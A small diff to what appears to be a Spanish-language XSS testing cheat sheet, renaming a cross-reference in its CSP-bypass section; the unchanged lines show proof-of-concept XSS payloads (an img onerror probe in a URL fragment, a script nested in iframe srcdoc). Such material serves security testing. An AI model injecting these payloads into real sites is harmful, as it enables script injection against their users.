@@ -55,7 +55,7 @@ Probar: https://target/page#<img src=x onerror=alert(1)>
 <iframe srcdoc="<script>alert(1)</script>">    -- anidado vía srcdoc
 ```
 
-## CSP bypass (cuando hay CSP — ver hunt-csp / gotchas)
+## CSP bypass (cuando hay CSP — ver csp / gotchas)
 
 ```
 -- unsafe-inline presente: cualquier payload inline funciona
